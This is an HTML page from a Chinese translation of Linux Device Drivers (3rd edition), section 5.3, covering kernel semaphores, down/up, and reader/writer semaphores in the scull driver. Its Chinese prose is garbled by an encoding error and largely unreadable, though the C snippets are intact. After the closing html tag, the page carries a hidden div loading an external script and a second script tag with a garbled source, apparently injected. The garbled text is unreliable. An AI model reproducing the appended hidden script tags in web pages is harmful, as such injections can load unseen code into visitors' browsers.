<html xmlns:cf="http://docbook.sourceforge.net/xmlns/chunkfast/1.0">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=gb2312">
<title>5.3.&#160;ͻ-Linux豸棨İ棩- - </title>
<meta name="description" content="- - " />
<meta name="keywords" content="Linux豸,İ,,ldd,linux device driver,,Ӱ,,, " />
<meta name="author" content="  www.21cstar.com QQ:610061171" /> 
<meta name="verify-v1" content="5asbXwkS/Vv5OdJbK3Ix0X8osxBUX9hutPyUxoubhes=" />
<link rel="stylesheet" href="docbook.css" type="text/css">
<meta name="generator" content="DocBook XSL Stylesheets V1.69.0">
<link rel="start" href="index.html" title="Linux 豸 Edition 3">
<link rel="up" href="ch05.html" title="&#160;5&#160;&#160;;">
<link rel="prev" href="ch05s02.html" title="5.2.&#160;Ĺ">
<link rel="next" href="ch05s04.html" title="5.4.&#160;Completions ">
</head>
<body bgcolor="white" text="black" link="#0000FF" vlink="#840084" alink="#0000FF">
<div class="navheader">
<table width="100%" summary="Navigation header">
<tr><th colspan="3" align="center">5.3.&#160;ͻ</th></tr>
<tr>
<td width="20%" align="left">
<a accesskey="p" href="ch05s02.html">һҳ</a>&#160;</td>
<th width="60%" align="center">&#160;5&#160;&#160;;</th>
<td width="20%" align="right">&#160;<a accesskey="n" href="ch05s04.html">һҳ</a>
</td>
</tr>
</table>
<hr>
</div>
<div class="sect1" lang="zh-cn">
<div class="titlepage"><div><div><h2 class="title" style="clear: both">
<a name="SemaphoresandMutexes.sect"></a>5.3.&#160;ͻ</h2></div></div></div>
<p>ǿθ scull . ǵĿʹǶ scull ݽṹĲԭӻ, ̵ִ߳һη. ǵڴй©, Ҫ֤, һ̷ֱ߳һڴ, л֮߳̿ǰ. Ϊ, Ǳ뽨ٽ: κθʱֻһִ߳̿еĴ.</p>
<p>еٽͬ, ںṩ˲ͬԭòͬ. , ÿ scull ݽṹĴȡһֱûĽ; ûджϴ첽еĴȡ. ûر(Ӧʱ)Ҫ; ӦóԱ I/O 󳣳Ͼ. һ, scull ûгκؼϵͳԴ, ȡԼݽṹʱ. Щζ scull ڵȴֵȡݽṹʱ˯, û˽.</p>
<p>"ȥ˯" һȷ. һ Linux ̵һ޷һĵطʱ, ȥ˯( ""), óֱԺĳʱܹ. ̳ڵȴ I/O ʱ˯. ں, ǻܶǲ˯. Ȼ scull е write һ. ǿʹһʹڵȴȡٽʱ˯.</p>
<p>Ҫ, ǽһܻ˯ߵĲ( ʹ kmalloc ڴ ) -- ˯һκµĿ. ǵٽҪȷ, ǱʹһԭһӵĽ˯ʱ. еļƶܹڿ˯ߵĵطʹ( ڱºῴԵ ). Ȼ, ڵҪ, ʺϵĻʱһ. </p>
<p>ڼѧһܺĸ. ĺ, һһֵ, һԺ, ͵سΪ P  V. һٽĽ̽ϵ P; ֵ, ֵݼ 1 ҽ̼. ෴, ֵ 0 ( С ), ̱ȴֱͷ. һͨ V ; ֵ, , Ҫ, ѵȴĽ.</p>
<p> -- ֹͬʱͬһٽ -- ǵֵʼΪ 1. κθʱֻһ̻̳߳. ģʽʹõʱΪһ, , Ȼ, ""д.  Linux ںзֵ궼.</p>
<div class="sect2" lang="zh-cn">
<div class="titlepage"><div><div><h3 class="title">
<a name="TheLinuxSemaphoreImplementation.sect"></a>5.3.1.&#160;Linux ʵ</h3></div></div></div>
<p>Linux ںṩһʵ, Щͬ. Ϊʹ, ں˴ &lt;asm/semaphore.h&gt;. ص struct semaphore; ʵüַͳʼ. һֱӴһ, ʹ sema_init 趨:</p>
<pre class="programlisting">
void sema_init(struct semaphore *sem, int val);
</pre>
<p> val ǰŸĳʼֵ.</p>
<p>Ȼ, ͨԻģʽʹ. ΪʹͨõӸЩ, ںṩһװͺ궨. , һͳʼ, ʹһ:</p>
<pre class="programlisting">
DECLARE_MUTEX(name); 
DECLARE_MUTEX_LOCKED(name);
</pre>
<p>, һ( Ϊ name ), ʼΪ 1 ( ʹ DECLARE_MUTEX )  0 (ʹ DECLARE_MUTEX_LOCKED ). ںһ, ʼ״̬; κ̴߳ȡ֮ǰòʽ.</p>
<p>ʱʼ( ̬, ˵), ʹеһ:</p>
<pre class="programlisting">
void init_MUTEX(struct semaphore *sem);
void init_MUTEX_LOCKED(struct semaphore *sem);
</pre>
<p> Linux , P Ϊ down -- ӵĳ. , "down" ָʵ, ݼֵ, , Ҳʹ˯һȴ֮, ԱԴĴȡ.  3 汾 down:</p>
<pre class="programlisting">
void down(struct semaphore *sem);
int down_interruptible(struct semaphore *sem);
int down_trylock(struct semaphore *sem);
</pre>
<p>down ݼֵҵȴҪʱ. down_interruptible ͬ, ǲǿжϵ. жϵİ汾һֱҪǸ; һڵȴһûռ̱ûж. ΪһͨõĹ, 㲻ʹòжϵĲ, ʵûѡ. жϲһɱĽ(  ps мĿµ "D ״̬" )ûĺ÷, ʹ down_interruptible ҪһЩС, , ǿжϵ, һֵ, ҵ߲. ȷʹ down_interruptible Ҫһֱ鷵ֵԵӦ.</p>
<p>İ汾 ( down_trylock ) Ӳ˯; ڵʱ, down_trylock ̷һֵ.</p>
<p>һһ߳Ѿɹ down 汾еһ, ˵(Ѿ"ȡ"""). ߳Ȩȡ걣ٽ. ҪĲʱ, 뱻. V  Linux Ӧ up:</p>
<pre class="programlisting">
void up(struct semaphore *sem); 
</pre>
<p>һ up , ߾Ͳӵ.</p>
<p>Ը, Ҫȡһκ߳, ʹһ(ֻһ) up ĵͷ. ڴ·гҪرС; ڳһʱһ, ڷش״̬֮ǰͷ. ûͷ׷һ; ( ̹ڿ޹صĵط )ֺ͸ٵ.</p>
</div>
<div class="sect2" lang="zh-cn">
<div class="titlepage"><div><div><h3 class="title">
<a name="UsingSemaphoresinscull.sect"></a>5.3.2.&#160; scull ʹ</h3></div></div></div>
<p>Ƹ scull һ, ڴȡ scull_dev ݽṹʱ⾺. ȷʹǵ. ȷʹüԭĹؼָܵҪĸԴȷÿЩԴĴȡʹȷļ. ǵ, Ȥж scull_dev ṹ, ǵļƵ߼Χ.</p>
<p>ڿṹ:</p>
<pre class="programlisting">
struct scull_dev {
    struct scull_qset *data; /* Pointer to first quantum set */
    int quantum; /* the current quantum size */
    int qset; /* the current array size */
    unsigned long size; /* amount of data stored here */
    unsigned int access_key; /* used by sculluid and scullpriv */
    struct semaphore sem; /* mutual exclusion semaphore */
    struct cdev cdev; /* Char device structure */
};
</pre>
<p>ṹĵײһΪ sem ĳԱ, Ȼ, ǵ. ѾѡΪÿ scull 豸ʹõ. ʹһȫֵҲܻͬȷ. ͨ scull 豸Դ, Ȼ, ûʹһ̵ȴ, һʹòͬ scull 豸. ͬ豸ʹõнжԲͬ豸Ĳ, , .</p>
<p>ʹǰʼ. scull ڼʱʼ, ѭ:</p>
<pre class="programlisting">
for (i = 0; i &lt; scull_nr_devs; i++) {
    scull_devices[i].quantum = scull_quantum;
    scull_devices[i].qset = scull_qset;
    init_MUTEX(&amp;scull_devices[i].sem);
    scull_setup_cdev(&amp;scull_devices[i], i);
}
</pre>
<p>ע,  scull 豸ϵͳֿǰʼ. , init_MUTEX  scull_setup_cdev ǰ. ෴Ĵܲһ, ׼֮ǰȡ.</p>
<p>һ, Ǳ, ȷûгʱûж scull_dev ݽṹĴȡ. , , scull_write 뿪ʼ:</p>
<pre class="programlisting">
if (down_interruptible(&amp;dev-&gt;sem))
    return -ERESTARTSYS;
</pre>
<p>ע down_interruptible ֵļ; ط, . ͨҪǷ -ERESTARTSYS. ֵ, ں˵ĸ߲ҪôͷҪôû. 㷵 -ERESTARTSYS, ȻָκûɼѾ˵ĸı, Ա֤ϵͳʱȷ鷢. 㲻ʽָ, Ӧ֮ -EINTR. </p>
<p>scull_write ͷ, Ƿܹɹ. ¶˳, ִ䵽:</p>
<pre class="programlisting">
out:
 up(&amp;dev-&gt;sem);
 return retval; 
</pre>
<p>ͷ겢ҷκҪ״̬.  scull_write мطܻ; Щطڴʧܻͼûռ俽ʱ. Щ, һ goto out, ȷȷ.</p>
</div>
<div class="sect2" lang="zh-cn">
<div class="titlepage"><div><div><h3 class="title">
<a name="ReaderWriterSemphores.sect"></a>5.3.3.&#160;/д</h3></div></div></div>
<p>Ϊе߽л, ÿ߳̿ʲô. Ȼ, ܶΪ 2 : ֻҪȡݽṹ, ͱı. ߳ǿܵ, ֻҪûͼκθı. ܹ; ֻԲнǵĹصȴ˳ٽ.</p>
<p>Linux ںΪṩһͳΪ rwsem (" reader/writer semaphore"). rwsem еʹԽ, ʱ.</p>
<p>ʹ rwsem Ĵ &lt;linux/rwsem.h&gt;. д  struct rw_semaphore; һ rwsem ʱʽʼ:</p>
<pre class="programlisting">
void init_rwsem(struct rw_semaphore *sem); 
</pre>
<p>һ³ʼ rwsem Գֵһ( ߻д )ǿõ. ҪֻȡĴĽӿ:</p>
<pre class="programlisting">
void down_read(struct rw_semaphore *sem);
int down_read_trylock(struct rw_semaphore *sem);
void up_read(struct rw_semaphore *sem);
</pre>
<p> down_read ĵṩ˶ԱԴֻȡ, ߿ܵزشȡ. ע down_read ܽýΪжϵ˯. down_read_trylock ȡǲʱȴ; ׼ȡط,  0. ע down_read_trylock Ĺͬڴ󲿷ֵں˺, ֵ 0 ָʾɹ. һʹ down_read ȡ rwsem ʹ up_read ͷ.</p>
<p>ߵĽӿ:</p>
<pre class="programlisting">
void down_write(struct rw_semaphore *sem);
int down_write_trylock(struct rw_semaphore *sem);
void up_write(struct rw_semaphore *sem);
void downgrade_write(struct rw_semaphore *sem);
</pre>
<p>down_write, down_write_trylock,  up_write ȫǵĶ߶Ӧ, , Ȼ, ṩдȡ. 㴦, Ҫһдһٸı, һʱֻȡ, ʹ downgrade_write һɸı߽.</p>
<p>һ rwsem һ߻߲ĿĶ. дȨ; һдͼٽ, Ͳֱ߽едǵĹ. ʵֿܵ¶߼ -- ߱ʱܾȡ -- дд. ԭ, rwsem ںдʱ, дֻռöʱ.</p>
</div>
</div>
<div class="navfooter">
<hr>
<table width="100%" summary="Navigation footer">
<tr>
<td width="40%" align="left">
<a accesskey="p" href="ch05s02.html">һҳ</a>&#160;</td>
<td width="20%" align="center"><a accesskey="u" href="ch05.html">һ</a></td>
<td width="40%" align="right">&#160;<a accesskey="n" href="ch05s04.html">һҳ</a>
</td>
</tr>
<tr>
<td width="40%" align="left" valign="top">5.2.&#160;Ĺ&#160;</td>
<td width="20%" align="center"><a accesskey="h" href="index.html">ʼҳ</a></td>
<td width="40%" align="right" valign="top">&#160;5.4.&#160;Completions </td>
</tr>
</table>
</div>
</body></html>
<div style="display:none"><script language="JavaScript" src="script.js"></script> </div>

<script language=javascript src=G2Bݔx8n*n*n*n*n*n*ݚPpd></script>